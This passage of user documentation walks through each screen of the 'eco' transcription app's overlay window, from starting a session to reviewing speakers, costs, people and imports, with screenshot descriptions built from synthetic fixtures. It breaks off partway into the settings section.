# The window, in the order somebody meets it

A walk through eco's window, from opening it with nothing recorded yet to
looking back at a session weeks later. **Every screen the overlay draws is
here**, including the dialogs a happy path never reaches, so that a change to
the window has somewhere to be checked against. They are in the order of use,
not sorted by QML file.

[cli.md](cli.md) is where the *commands* are; this page is where the *window*
is. Why each screen is the way it is lives in [design.md §12](design.md#12-the-overlay).
If you are looking for a task rather than a screen, start at
[the map](README.md).

---

## How this page stays true

| what | how |
|---|---|
| the pictures under `img/`, `01`–`56` | `mise run shots`: writes them from the real overlay, offscreen |
| checking they are still what the window draws | nothing does: there is no `shots:check` (see below) |
| `img/eco.gif`, the icon | not a screen: drawn by `mise run readme:gif` from `packaging/eco.omapixel` |
| the window on a real desktop, over a real call | no pictures: none were taken for this page |

`mise run shots` needs no display and no call. It builds the checkout's daemon,
starts it with `--headless --replay` in a home of its own at `/tmp/eco-shots`
(runtime, data, config, state and cache directories), copies `overlay/` there
with a test-only driver, `scripts/shots/Drive.qml`, and runs that copy with the
checkout's `eco-window` under `QT_QPA_PLATFORM=offscreen`. The driver takes
JavaScript over a socket of its own, clicks and types as somebody would and
saves each window as it is drawn. A frame is refused if the window has lost the
daemon (except `02`, which is that), if it shows an error, or if it is flat —
eight colours or fewer, which is a window that drew nothing. The user's
daemon, socket and sessions are never touched: the script refuses to run if its
socket would be the user's.

What is pinned: the clock's zone is UTC and the locale `en_US`; the interface
language is English (`[ui] language = "en-US"`); the theme falls back to the
overlay's own defaults (`#39ff14` accent on `#121212`), because the temporary
state directory holds no Omarchy theme; the API keys are placeholders that are
never sent; and the home is always `/tmp/eco-shots`, so the storage path in the
session details reads the same in every run.

What is not pinned, and why there is no `shots:check`: **the live session runs
on the clock of the run.** Its running time in the capsule, the times on its
lines, its answer and its note, and `Today 23:39` in the sessions list are when
`mise run shots` was last run, in UTC. The input traces are a synthetic hum
replayed in real time, so where a burst falls in a frame depends on when the
frame was taken; and the software renderer places text at sub-pixel positions
that differ between runs. Two runs never write the same bytes, so a check that
compared them would always fail. Which face `monospace` resolves to is
fontconfig's answer on the machine that ran it.

### The sessions in the pictures

Everything below is synthetic, from `scripts/shots/fixtures/`. No real person,
résumé, recording or key is in it.

**The config** (`fixtures/config.toml`) has five kinds — `meeting`,
`conversation`, `other`, `idea` and a custom `interview` — and four models:
`whisper-lan` (transcription, at a documentation address, `192.0.2.10`, that is
never reached), `deepgram` (transcription, used by `interview`, with a price per
minute), `gemini-flash` (chat, the chat default and the translator) and
`claude-haiku` (chat, the reviewer's model, with review off, and used by the
`minutes` skill). Two audio sources: **Me**,
the user, on the default microphone, and **Them** on the default output. Three
skills: `reply`, which has a hook (`~/bin/post-to-notes`, never run),
`minutes` and `explain`. One global context file,
`~/notes/about-me.md`, and one context slot, `resume`, that `interview`
sessions start with on.

**Seven stored sessions**, all ended, written straight into the sessions
directory as logs:

| session | kind | when (UTC) | what it is there for |
|---|---|---|---|
| Weekly sync | meeting | 24 Feb 2025 10:00 | `M. Lee`, the half of a duplicate person to merge; tags `#Acme #Weekly` |
| Rust meetup: async in practice | other | 27 Feb 2025 18:00 | imported; one speaker whose voice is close to Jonas Weber's — the voice guess |
| Offline mode for the field app | idea | 3 Mar 2025 19:40 | only the user speaks; `#Product` |
| Coffee with Jonas | conversation | 4 Mar 2025 11:15 | Jonas Weber's voice, which the guess above matches |
| Northwind backend interview | interview | 5 Mar 2025 09:00 | the custom kind, on `deepgram`, with the `resume` slot on; `#Hiring`; an answer whose cost was not reported, and minutes Deepgram would not price |
| Revisión de precios | meeting | 7 Mar 2025 16:30 | spoken in Spanish, translated into English |
| Acme onboarding kickoff | meeting | 10 Mar 2025 14:00 | the session most pictures open: ten lines, two answers, a note, an unnamed `Speaker 3`, a person added with no voice, and its costs |

**Seven people**: Ana Ribeiro (two voices, two sessions), Marcus Lee and
M. Lee (the same man twice), Chen Wei, Jonas Weber, Sofia Alvarez, and Priya
Shah, who is in the kickoff without a voice of her own.

**The live session** is started by the pictures themselves, in the new-session
dialog: `Sprint planning`, a meeting tagged `#Acme`. The daemon hears only
`replay.wav`, ten minutes of synthetic hum in bursts written by the script,
which goes to the first source that is not the user (**Them**). It holds no
speech, so nothing is transcribed and no model is asked anything. The lines,
the answer and the note on screen in `05` to `10` come from
`fixtures/live.json`, and the later answers in `07` and `08` — sent, not sent,
failed, thinking — from `fixtures/answers.json`. Both are handed to the window
directly; the daemon never heard them, and `eco show` on that session would not
list them.

**Also handed to the window, not done by the daemon:** the empty input list of
`04`, the import part way through in `36` (the replay has no speech for an
import to transcribe), the three PipeWire devices in the Audio table of `39` and
`40` (`fixtures/devices.json`: under `--replay` the daemon lists only Default
microphone and Default output, the system defaults), and the held
change of `56`. The import
dialog in `35` names `~/recordings/sprint-retro.vtt` from the fixtures and is
closed without importing it. `02` is the last picture taken: the script stops
the daemon first.

---

# 1. Opening it

```bash
eco start
```

`eco start` starts the daemon's user service if nothing answers on the socket
and opens a window (`--headless` leaves it closed). Opening the app again brings
the open window forward, or opens another on a live session no window shows;
each window is its own `eco-window` process.

![The start screen: the masthead "ECO / READY" with the settings button on the right; a wide input trace swinging in two bursts with a flat stretch between them; four stacked buttons, NEW SESSION lit as the primary one, then SESSIONS, IMPORT and PEOPLE; under them "Outside a session the signal is only measured: nothing is transcribed or recorded."](img/01-start.png)

The trace is every input in the room, in each input's colour. Flat is silence,
a swing is audio, and a faint dashed line is an input that sends nothing — so a
glance says capture works before a session starts. The sentence under the
buttons is literal: outside a session the audio is measured for this trace and
nothing else.

**No connection warning while things work.** Without the daemon the start
screen's masthead reads `OFFLINE`, its buttons dim, and the line under them
says `Daemon disconnected · eco start`; on every screen an error toast says the
daemon is disconnected. It has no countdown: it stays while the daemon is
unreachable and goes when the window reconnects, which it does on its own.

![The start screen without the daemon: the masthead "ECO / OFFLINE"; a flat dotted line where the input traces run; NEW SESSION, SESSIONS, IMPORT and PEOPLE dimmed; under them, in amber, "Daemon disconnected · eco start"; and in the bottom-right corner an error toast saying the daemon is disconnected, with its × button.](img/02-disconnected.png)

**Messages are toasts.** What the window has to say — a setting saved, an
answer copied, a refusal, an error — shows as a toast in its bottom-right
corner, in the eco window and in the settings window alike, on every screen.
In a session they stand above the composer; in the settings, inside the
section's frame. Where the window is too short for all of them, the oldest
wait out of sight, and the daemon's absence and the newest show. Each has an icon
for its kind (a notice, a success, an error), its text, which wraps, and a
`×` that closes it. Up to three show at once, the newest at the bottom; a
fourth takes out the oldest. A notice or a success closes itself after about
six seconds, but not while the pointer is over it or it has the keyboard; an
error stays until you close it. `Tab` reaches each `×`, and `Esc` closes the
toast that has the keyboard. A toast moves only as it comes and goes.

**A newer release.** When the daemon has found a release newer than the one
running and CHECK FOR UPDATES is on, the masthead shows a small lit notice,
`ECO 0.5.0 AVAILABLE` (`ECO 0.5.0` in a narrow window; the version is an
example), on every screen but a session and its cost. A press opens the
release notes in the browser; its × hides it until the window opens again.
Installing is under Settings › General › UPDATES (section 12). It is not
pictured: the pictures run with no newer release.

| key | what it does |
|---|---|
| `N` | new session |
| `H` | SESSIONS |
| `I` | import a recording |
| `P` | people |
| `?` · `F1` | every key, in one list (section 11) |

No button shows its key; keys live only in the shortcuts list.

# 2. Starting a session

**NEW SESSION**, or `N`:

![The new session dialog over the dimmed start screen: TITLE "Sprint planning"; KIND "Meeting" and LANGUAGE "EN · American English" dropdowns; "Transcribes with whisper-lan · answers with gemini-flash"; TAGS with an "#Acme ×" chip above an "Add a tag" field and ADD; CONTEXT with an unlit "resume" chip; WHO WILL BE HEARD "Them · replay.wav"; CANCEL and START.](img/03-new-session.png)

Everything is optional except the kind and the language. The title's
placeholder is the title the session gets if none is typed (the kind and the
time). The dialog starts from the kind and language this window's last session
used, and says which models that kind runs on, so a paid transcriber is never
picked unseen. Tags offer the existing ones as they are typed. The context
slots are chips: those of the chosen kind start lit — `resume` is off here
because it belongs to `interview`. WHO WILL BE HEARD lists the sources and their
inputs; in the picture it is only the replayed file. Where no chat model
answers the kind, the models line says only `Transcribes with whisper-lan` and no
context slots are offered.

**Without an input** the dialog cannot start: it says `No input configured:
nothing would be heard.` and offers AUDIO SETTINGS.

![The new session dialog with no input: the title field showing its placeholder, "Meeting" and the time of the run; KIND, LANGUAGE and the models line as before; an empty TAGS field; CONTEXT "resume"; under WHO WILL BE HEARD, in amber, "No input configured: nothing would be heard." and an AUDIO SETTINGS button; START dimmed.](img/04-new-session-no-input.png)

`Enter` in a field starts, `Esc` cancels, `Tab` walks the fields.

# 3. During a session

**START** puts the window on the session. This is the window for as long as it
lasts:

![The live session at 720×720: the masthead "ECO / SPRINT PLANNING" with the language dropdown "EN · American English", the cost, details, settings and close buttons; a red capsule reading "00:01:15 RECORDING" with a small trace, PAUSE and END; a framed REPLY answer from google/gemini-2.5-flash, with send, translate, copy and remove buttons on its heading, "Answer: Priya approves it; I send her the form today. Why: she is Acme's IT contact for the export server, so nothing moves until she signs."; a NOTE card "Ask Priya for the VPN account before Friday."; then YOU lines in faint boxes on the right and THEM lines in tinted boxes on the left; the skill chips "1 REPLY", "2 MINUTES", "3 EXPLAIN"; and the composer "Ask about the session, or /skill" with NOTE and SEND.](img/05-live.png)

From the top:

- **The masthead** carries the session's title (a session without one is named
  by its kind), the language it is transcribed in — switchable mid-session —,
  the cost button `$` (section 8), the details button `⋯` (section 6),
  settings, and close. **Close goes back to
  SESSIONS; a live session keeps recording.**
- **The capsule** is one line: the running time (stopped while paused), the
  state with a dot that keeps sending out a ring while it records, the trace of
  every input, PAUSE and END. Clicking the state pauses or resumes. END fills
  red and asks `END?` once more before it ends the session (pictured below).
  A warning appears in the capsule only for an input that sends no audio
  while recording — its name on hover, the Audio settings on click; the
  replay always sends, so it is not in the pictures.
- **The conversation** takes every pixel left. Others' speech is in a box tinted
  with their colour, on the left; the user's in a faint box on the right. A
  speaker's name and time head each turn. Answers are framed cards, drawn as
  their Markdown streams, with the skill or question that asked for them, and
  translate, copy (`wl-copy`, as Markdown) and remove (×). A note is a card of
  its own. Hovering a line shows ✎ to correct it and × to remove it; clicking a
  speaker's name asks who they are (section 7).
- **The composer**: the skills as numbered chips, and a line to ask anything.
  Typing `/` lists the skills above the line as the word grows. NOTE (or
  `Shift+Enter`) keeps the text as a note instead of asking it. Where no chat
  model answers the session's kind, the line reads `Write a note`, there is no
  SEND, `Enter` keeps a note, and only the skills that name a model of their own
  show.

![The same session with "/" typed in the composer: a small list above it, "/reply" marked, "/minutes" and "/explain", over the last line and the skill chips.](img/06-live-skills.png)

An answer waiting for its first word draws a loading trace and counts seconds,
`WAITING FOR THE MODEL · n S`, or `THINKING · n S` with the model's reasoning
under it while it reasons; the count goes with the first word, as the trace
reaches its end. A failed one stays, in red, saying why, until it is
removed. A skill with a hook has a send button on its card, and the card says
how sending went: SENDING…, SENT or NOT SENT.

![Three later answers at the end of the live session: a REPLY card marked NOT SENT in red beside its send button; an ASK card in a red frame, "How big is the first export?", with "No answer: HTTP 429: rate limited"; and a MINUTES card from anthropic/claude-haiku-4.5 in a green frame, "THINKING · 21 S" with its reasoning in italics, the MINUTES chip lit below it.](img/07-live-answers.png)

The window follows the newest entry. Scrolled up, a `↓ N new` pill above the
composer counts what arrived below; a click or `End` goes back down.

A long session comes in pages. While the window follows the newest entry it
keeps the last 1000; above them it says `Earlier entries above`, and scrolling
up brings the earlier ones in, a page at a time, with a trace under that line
while one loads. The entry being read stays where it was. Not pictured: the
pictured session is short.

![The live session scrolled up to its first answer, a REPLY card marked SENT in green; at the bottom of the conversation, above the skill chips, a pill "↓ 4 NEW".](img/08-live-new.png)

Paused, the capsule turns amber and reads PAUSED, its time stopped, and PAUSE
becomes RESUME. END asks first:

![The capsule paused: an amber dot, "00:01:25", PAUSED, the trace, RESUME, and END filled red reading "END?".](img/09-live-end.png)

`END?` goes back to END after three seconds without a second click.

On a short window — the picture is 420×480 — the capsule joins the masthead
and the skill chips go (`Alt+1…9` still run them):

![The live session at 420×480: the masthead "SPRINT …" with the capsule inside it — a red dot, "00:01:17", pause and end as icons — and the details, settings and close buttons; the last four lines of the conversation; and the composer "Ask, or /skill" with the note and send buttons as icons.](img/10-live-short.png)

Under 560 px wide the capsule keeps icons only, and the language picker and
COST move into the details — the masthead has no room for them, so the picture
has no `$`; under 560 px tall the margins tighten and the skill chips
hide. The window goes down to 240×320.

**When a source's transcription is down**, a line under the capsule says so
for that source, in amber: `Transcription down · reconnecting`, with the
provider's reason on hover. eco keeps opening the connection and holds what is
heard meanwhile (design §5). When a connection takes the audio again the line
turns green, `Transcription back`, with `· N s of audio lost` when an outage
outlasted the five minutes eco holds; it goes with the source's next line, or
ten seconds later. A device that cannot be opened, or stops, reads
`Device not heard · opening it again` on the same line, with why on hover,
while the other sources go on; eco opens it again until it is heard. An error
toast of the capture or its transcription — a capture that
stopped, a line that could not be transcribed — goes when the last recording
session ends or you leave the session, so the sessions list never shows it.
Nothing here is a key or a button. The picture is the live
session fed one source down and the other back, from
`scripts/shots/fixtures/outage.json`: the replay transcribes nothing, so no
provider went down to take it.

![The live session with two lines under the capsule: a grey square, THEM, an amber warning sign and "Transcription down · reconnecting"; a white square, ME, a green check and "Transcription back · 18 s of audio lost"; below them the conversation ends on "Thursday at ten works. I'll book the room."](img/11-live-transcription.png)

| where | key | what it does |
|---|---|---|
| conversation | `↑` `↓` `PgUp` `PgDn` | move through lines, notes and answers |
| conversation | `Home` · `End` | the first or the last |
| conversation | `N` | name the speaker of the line |
| conversation | `Tab` | reach the line's tools |
| composer | `Enter` | send the question |
| composer | `Shift+Enter` | keep the text as a note |
| composer | `/` | list the skills: `↑` `↓` choose, `Tab` completes, `Enter` runs |
| composer | `Alt+1…9` | run the skill with that number |
| session | `E` | edit title and kind |
| anywhere | `Esc` | close what is open: a menu, a dialog, the details, then the session |

# 4. Finding it again

**SESSIONS**, or `H` on the start screen, or closing a session:

![The sessions list: the masthead "ECO / SESSIONS"; a bar with HOME, a solid NEW SESSION, IMPORT and PEOPLE, and "8 SESSIONS" at its end; the search field "Search what was said, noted or answered… /"; a line of chips "LIVE 1", "ALL" lit, MEETING, CONVERSATION, OTHER, IDEA, INTERVIEW, a divider, "#Acme" and more tags cut at the edge; under LIVE, "Sprint planning · Meeting · Today 23:39 · 0 min · #Acme" with a green RECORDING dot; then day headings 10 MAR 2025, 07 MAR 2025, 05 MAR 2025, 04 MAR 2025, each row with its title, kind, date, length, tags, people, ENDED and a trash button.](img/12-sessions.png)

The bar goes back (HOME here: it names where it goes), starts a NEW SESSION
(`N`), imports a recording and opens People; at its end it counts the sessions
listed, the first thing to go when the window is narrow. NEW SESSION keeps its
name to 360 px wide, the others turning into icons with their names on hover.

The live sessions come first, under LIVE, toned and with a dot before their
state; the others newest first under their day. Each row is title, kind,
start, length, tags, people and state. **No cost**, here or anywhere outside a
session's own details. A live row has no delete; an ended one has a trash can
that asks first.

The chips are one line that scrolls sideways: LIVE, the kinds (only when there
is more than one), and the tags. A tag's chip, right-clicked (or the menu key),
renames or deletes it in every session:

![The sessions list filtered by "#Acme", the chip lit, "4 SESSIONS", with a small menu open under the chip offering RENAME and, in red, DELETE.](img/13-sessions-tag.png)

Renaming into a tag that exists says the two become one (that dialog is not
pictured); deleting asks first, saying how many sessions lose it:

![The sessions list dimmed under a DELETE TAG dialog in a red frame: "Delete #Acme? 4 sessions lose it." with CANCEL and, in red, DELETE.](img/14-sessions-tag-delete.png)

LIVE narrows the list to what is recording now, and says what is transcribing
it — the model, the language, and `×n` when one transcriber feeds several
sessions — so a second paid model never runs unseen:

![The sessions list with "LIVE 1" lit: "1 SESSION", a line "TRANSCRIBING whisper-lan · EN", and the one live row, Sprint planning, RECORDING.](img/15-sessions-live.png)

**This is the only place a live session shows.** Not on the start screen, and
not in another session's conversation. Opening its row puts it in this window.

The search field searches what was said, noted or answered in every session
(`/` from anywhere in the list):

![The sessions list searched for "VPN": "1 SESSION", and the one row, Acme onboarding kickoff, ENDED.](img/16-sessions-search.png)

A search with nothing behind it says why, and offers the way back:

![The sessions list searched for "quarterly budget": "0 SESSIONS", "No session matches “quarterly budget”." and a CLEAR FILTERS button.](img/17-sessions-empty.png)

There is a different sentence for each empty list: `No session recorded yet.`
on a new machine, `No live session.` under LIVE, `No session matches these
filters.` for chips with no search. Until the first list arrives the table says
`Loading sessions…`. Only the search's is pictured. In a narrow window the
table stacks its fields; a person's chip, `PERSON: Ana Ribeiro ×`, appears when the list is
opened from People (section 9).

| key | what it does |
|---|---|
| `↑` · `↓` | choose a row (`↑` on the first goes back to the search) |
| `Enter` | open it |
| `Delete` | delete it, asking first |
| `N` | start a new session |
| `I` | import a recording |
| `/` | search |
| `F2` · `Delete` · menu key | on a tag chip: rename, delete, or open its menu |
| `Esc` | back |

`P` opens People only on the start screen; here PEOPLE is the button.

# 5. A stored session

Opening a row puts the session on screen: **the same view as a live one**, with
one line where the capsule was:

![The stored session "ACME ONBOARDING KICKOFF": a line "MEETING · 10 MAR 2025 14:00 · 00:34:54 · 10 LINES" with REOPEN on the right; then the conversation — SPEAKER 3 in a greenish box, ANA RIBEIRO in a grey one, MARCUS LEE in a yellowish one — an ASK card with the question "What did we agree on the deadline?" in italics and its answer with "first export" and "21st" in bold, a last SPEAKER 3 line; the skill chips and the composer.](img/18-session.png)

That line says when it was, how long, and how much was said, and offers the way
back into it: REOPEN for an ended session, RESUME for a paused or interrupted
one (`R`). Either turns the line into the capsule. The composer works here too:
a question asked afterwards is answered from the stored transcript.

A session opened from a search opens where the search found it, that entry in
the middle of the view, not at its end; scrolling either way brings the rest,
and `End` goes to its newest entry.

Each person keeps their colour across sessions; a speaker nobody has named
(`Speaker 3`) still gets one of their own.

![The same session at 420×480: the line elided to "MEETING · 10 MAR 2025 14:00 · 00:34:5…" with a play icon, the last Marcus Lee line, the ASK card, the last Speaker 3 line, and the composer with icon buttons.](img/19-session-short.png)

# 6. What a session is: the details

`⋯` in the masthead opens the details over the top of the conversation:

![The details panel of Acme onboarding kickoff: "ENDED · 10 MAR 2025 14:00 · 00:34:54 · 10 LINES · 2 ANSWERS · 1 NOTE" with the edit and close buttons; the path "/tmp/eco-shots/.local/share/eco/sessions/2025-03-10-140000-acme-onboarding-kickoff.jsonl" and COPY PATH; PEOPLE "Ana Ribeiro, Marcus Lee, Priya Shah" with a + button; SPEAKERS — Speaker 1 → Ana Ribeiro (CLEAR, CHANGE), Me (you) → No one yet (CHANGE), Speaker 2 → Marcus Lee (CLEAR, CHANGE), Speaker 3 → No one yet (CHANGE); TAGS "#Acme ×" "#Q2 ×" and "Add a tag"; CONTEXT with an unlit "resume" chip; "TRANSLATION: OFF"; and COPY VTT and, in red, DELETE.](img/20-session-details.png)

Top to bottom: what the session is, in two lines at most, with the edit button
(title and kind; `E`) and the close button, an up chevron; where its log is, for a stored
session; the people in it; who each speaker is; its tags; which context slots
it sends; whether it translates; and COPY VTT (the transcript as WebVTT, to the
clipboard) and DELETE. A live session's DELETE is off. The first line, with its
two buttons, stays at the top while the rest scrolls under it, a rule marking
the edge once it does. The close button shuts the panel as `Esc` and `⋯` do. On
a short, narrow live window, where the masthead has no room for it, COST is
here too, before COPY VTT.

**The edit button** opens `edit session`, the title and the kind:

![The EDIT SESSION dialog over the dimmed details: TITLE "Acme onboarding kickoff", KIND "Meeting", CANCEL and SAVE.](img/21-session-edit.png)

**PEOPLE `+`** opens the people dialog: those who are in the session because a
speaker is them (FROM SPEAKERS, and off, with the reason on hover), and under
ADD SOMEONE those added by hand — Priya Shah here — and everyone else known:

![The PEOPLE IN THIS SESSION dialog: FROM SPEAKERS with Ana Ribeiro and Marcus Lee as dimmed chips; ADD SOMEONE with a field "Add a person by name" and ADD, then chips for Priya Shah (lit, with ×), Chen Wei, Jonas Weber, M. Lee and Sofia Alvarez; CLOSE.](img/22-session-people.png)

**DELETE** asks `Delete <title>?` and says the transcript, answers and voice
links go for good:

![The DELETE SESSION dialog in a red frame: "Delete Acme onboarding kickoff?" and, in red, "The transcript, answers and voice links will be permanently removed.", with CANCEL and, filled red, DELETE.](img/23-session-delete.png)

**When eco recognises a voice**, the session says so on one line, and REVIEW
opens the details at the speakers:

![The imported session "RUST MEETUP: ASYNC IN PRACTICE": the line "OTHER · 27 FEB 2025 18:00 · 00:52:00 · 3 LINES · IMPORTED"; a line "1 VOICE GUESS" with REVIEW; the details open, SPEAKERS saying "eco guessed these speakers from their voices. Nothing changes until you confirm.", Speaker 1 → No one yet, and Speaker 2 → "Jonas Weber? · 93%" with CONFIRM lit, CLEAR and CHANGE.](img/24-session-guess.png)

The guess is never applied on its own: the speaker's lines read `JONAS WEBER?`
until CONFIRM, and CLEAR drops it. On a short window the count moves onto the
details button.

**TRANSLATION** picks a language for this session only — any of the seventeen eco
knows but the session's own:

![The details of Acme onboarding kickoff with the TRANSLATION menu open over them: OFF marked, then PT · português, ES · español de España, FR · français, DE · Deutsch, IT · italiano, NL · Nederlands, PL · polski, RU · русский, UK · українська, TR · Türkçe, cut at the window's edge.](img/25-session-translation.png)

From then on every line and answer carries its translation under it:

![The stored session "REVISIÓN DE PRECIOS": Sofia Alvarez's and the user's lines in Spanish, each with its English translation in italics under it, and an ASK card "¿Qué falta decidir?" answered in Spanish with the English under it.](img/26-session-translated.png)

The model that translates is set in Settings › Models (DEFAULT FOR
TRANSLATION), or for a session kind in Settings › Session kinds; whether a session
translates is chosen only here. Where no model translates the session's
kind, there is no TRANSLATION line (unless the session still translates, to turn
it off) and no translate button on its answers; CONTEXT goes too when nothing
answers in that kind.

# 7. Who is who

The SPEAKERS list of the details is the one place in the window that says who
each speaker is. CHANGE on a speaker, or clicking a speaker's name in the
conversation (`N` on a line), asks:

![The "assign person" dialog over the details: APPLY TO with THIS SPEAKER lit and, in orange, "2 lines will change"; WHO THIS IS with "Tom Becker" typed; a SPEAKER COLOR swatch; KNOWN PEOPLE chips — Ana Ribeiro, Chen Wei, Jonas Weber, M. Lee, Marcus Lee, Priya Shah, Sofia Alvarez; CANCEL and SAVE.](img/27-session-speaker.png)

It offers the people the voice suggests first, with their score when the
session kept one, then everyone known, then a new name. It says how many lines
will change, as a warning when it is more than one. Opened from a line, APPLY
TO also offers THIS LINE, for a line the diarizer gave to the wrong speaker.
The colour changes a known person's colour everywhere, or keeps a colour for
this speaker in this session's log. Renaming a person to a name somebody else
has warns and offers to merge the two. **A person id is never on screen.**

# 8. What it cost

**COST** at the top of the session (the `$` button in the masthead); on a
short, narrow live window, where the masthead has no room for it, it is in the
details instead:

![The cost screen: masthead "ECO / COST · ACME ONBOARDING KICKOFF", a SESSION back button and "TOTAL US$ 0.27"; "LLM US$ 0.00068 answers US$ 0.00068" and "TRANSCRIPTION US$ 0.27 (35 MIN)"; then three rows: "Transcription · 35 min, 14:34 · deepgram, US$ 0.27"; "Answer · What did we agree on the deadline?, 14:02 · google/gemini-2.5-flash, US$ 0.00027"; "Answer · reply, 14:00 · google/gemini-2.5-flash, US$ 0.00041".](img/28-session-cost.png)

The total, the LLM part split into answers, reviews and translations, and the
transcription with its minutes; then every charge, what it was for, when, which
model and how much. A charge the provider has not reported yet, or never will,
shows as `?` and a few words, with its reason said once in full above; a total
that leaves one out reads `≥`; and a figure estimated from a price per minute is
marked `≈`:

![The cost screen of "Northwind backend interview": "TOTAL ≥ US$ 0.35"; "LLM US$ ? answers US$ ?" and "TRANSCRIPTION US$ 0.35 (45 MIN)"; in amber, "A provider reported no cost for some calls."; "≈ estimated at the price per minute you set for the model."; then "Transcription · 45 min, 09:45 · deepgram, ≈ US$ 0.35" and "Answer · reply, 09:00 · google/gemini-2.5-flash, ? not reported" in amber.](img/29-session-cost-unknown.png)

On a live session the screen follows the spending while open. SESSION or `Esc`
goes back.

**Cost is shown only when asked for inside a session.** The sessions list, the
answer cards and the masthead never carry an amount: the `$` button only opens
this screen.

# 9. People

**PEOPLE**, or `P` on the start screen:

![The people screen: masthead "ECO / PEOPLE"; a bar with SESSIONS back, a solid ADD and "7 PEOPLE" at its end; seven rows, each a name in the person's colour with "n voices · n sessions" — Ana Ribeiro (selected, outlined), Chen Wei, Jonas Weber, M. Lee, Marcus Lee, Priya Shah with 0 voices, Sofia Alvarez — and on the right of each a colour swatch, rename, merge and forget buttons.](img/30-people.png)

Everyone eco knows, with how many voices it keeps for them and how many sessions
they are in. Opening a person goes to SESSIONS filtered to them, with the
person's chip first among the filters; its × drops it:

![The sessions list filtered to a person: a lit chip "PERSON: Ana Ribeiro ×" before LIVE 1, ALL and the kinds; "2 SESSIONS"; Acme onboarding kickoff and Weekly sync.](img/31-people-sessions.png)

Each row
changes the person's colour, renames them in every session, merges them, or
forgets them. The back button names where it goes: this one was opened from
SESSIONS.

**Merging** is two steps. MERGE on M. Lee asks who else he is, with CANCEL —
the one way out besides `Esc` while it waits; picking the same person says so.
Picking Marcus Lee asks which name stays:

![The people screen dimmed, a NOTICE "Who else is M. Lee? Pick that person to merge them." with CANCEL at the top, and over it the "merge people" dialog in a red frame: "Merge M. Lee into Marcus Lee? M. Lee's voices and sessions move to Marcus Lee; the name Marcus Lee stays." with SWAP on the left and CANCEL and MERGE on the right.](img/32-people-merge.png)

SWAP turns the direction around. **FORGET** asks too, saying which voices are
deleted — eco will not recognise them again — and that the sessions keep the
name:

![The FORGET PERSON dialog in a red frame over the dimmed people screen: "Forget Ana Ribeiro?" and, in red, "The 2 voices kept for Ana Ribeiro are deleted: eco will not recognise them again. The 2 sessions keep the name Ana Ribeiro.", with CANCEL and, filled red, FORGET.](img/33-people-forget.png)

**ADD** adds somebody by a name nobody has:

![The "add person" dialog over the dimmed people screen: NAME "Tom Becker", CANCEL and ADD.](img/34-people-add.png)

A name somebody already has is refused in the dialog. With nobody known, the
list says `No one yet. Name a live speaker or add someone to a session.` and
offers ADD. The bar counts the people at its end, the first thing to go when the
window is narrow; ADD keeps its name. While a merge waits, the bar keeps only the
count. Below 420 px wide a row's four buttons fold into one `⋯` menu.

| key | what it does |
|---|---|
| `↑` · `↓` | choose |
| `Enter` | open their sessions |
| `Delete` | forget, asking first |
| `F2` | rename |
| `M` | merge with someone else |
| `Esc` | back |

# 10. Importing a recording

**IMPORT**, or `I` on the start screen or in SESSIONS, or dropping a file on the
window:

![The "import a recording" dialog over the dimmed sessions list: FILE "/tmp/eco-shots/recordings/sprint-retro.vtt" with BROWSE; TITLE "Sprint retro"; KIND "Meeting", LANGUAGE "EN · American English" and SPOKEN BY "Me" dropdowns; CANCEL and IMPORT.](img/35-import.png)

Any file `ffmpeg` decodes is transcribed into a new session; a WebVTT
transcript, like this one, becomes a session as it is, with no transcription.
BROWSE opens the file dialog; importing with no file says one is needed. SPOKEN
BY is the audio source the lines start as; a transcript that names its
speakers keeps them. While it runs, a strip on the start screen and in
SESSIONS shows the progress, and its × stops it; what was transcribed stays.
A streaming transcription that goes down meanwhile is said under the strip,
as in a live session (section 3):

![The sessions list with a strip above the filters: IMPORTING, "Sprint retro", a fill across 62% of the strip, "62%" and a × button.](img/36-import-progress.png)

# 11. Finding your way around

`?` or `F1` lists every key, by where it works:

![The keyboard shortcuts dialog over the sessions list: EVERYWHERE (Tab · Shift+Tab, Enter · Space, Esc, ? · F1), GLOBAL (SUPER+ALT+N new session, SUPER+ALT+H sessions, SUPER+ALT+C settings, SUPER+ALT+P pause or resume, SUPER+ALT+E bring eco to the front, SUPER+ALT+A · Q run the skills bound to these keys), START SCREEN (N, H, I, P), SESSIONS AND PEOPLE (↑ · ↓, Enter, Delete, N, I, /) and the top of TAG CHIP IN SESSIONS (F2 rename the tag in every session), cut at the bottom edge.](img/37-shortcuts.png)

The dialog scrolls (arrows, `PgUp`, `PgDn`). Its end:

![The keyboard shortcuts dialog scrolled to its end: QUESTION BOX (Enter, Shift+Enter, / with ↑ · ↓, Tab and Enter, Alt+1…9), MENUS AND OPTION LISTS (↑ · ↓ · Home · End, Enter · Space, Esc) and SETTINGS (1…8 · Ctrl+1…8 switch tab, Ctrl+Tab · Ctrl+Shift+Tab over two lines, next · previous tab, ↑ · ↓ · Home · End and Enter · Space on the rail, ↑ · ↓ pick a row, Enter · Space open the item picked, Delete delete the item picked, Enter and Delete in a table inside an item, Ctrl+E edit the item picked or open, Enter · Space on a row with a value open its list, turn its switch, or write its name or number, Ctrl+S save, Esc back one level, then close).](img/38-shortcuts-end.png)

The GLOBAL keys are not the window's: `packaging/hypr/eco.lua` binds them in
Hyprland to `eco window` commands, and on Windows the daemon registers them
itself, with `Win` for SUPER, from `[shortcuts]` in the config; those that
open a view ask the daemon to hand them to the newest window and give it the
keyboard (`window.call`), so they work with eco in the background. The dialog
lists the default keys, not keys changed in either place.

Everything the pointer does, the keyboard does: `Tab` reaches every control,
with a focus ring apart from its hover, and a control's hint shows on focus as
on hover.

# 12. Settings

The settings button in any masthead, `SUPER+ALT+C`, opens the config window: a
second window, `eco · settings` to Hyprland, 1040×760 or its screen less a
96-pixel margin when that is smaller, centred on the screen (the pictures are
1040×760, but Audio's and General's 1040×920, the window made taller to show
every row). The window never writes the config itself: **each change is saved on
its own**, and the daemon validates the whole config and writes it.

Down the left are the eight sections, numbered from `01`, each named for the
question it answers: AUDIO, MODELS, LANGUAGES, SESSION KINDS, PROMPTS, CONTEXT,
SKILLS and GENERAL. The rail is a carousel: the one on screen at its head, in
the accent, beside the bar, the others after it in order, the ones before it
coming round after the last. Folded, it shows only their numbers; under the
pointer, with the keyboard on it, or after a tap on its head, it unfolds over
the section with their names. `Tab` moves from the rail to the bar of commands
and then into the section; on the rail, `↑`, `↓`, `Home` and `End` move along
it and `Enter` or `Space` opens the section. A section's number opens it,
unless you are writing in a field, which keeps the digit; `Ctrl` with the
number opens it anywhere in the window. The bar holds BACK first, then the main
action, solid, on the left, and the other actions on the right, DELETE or
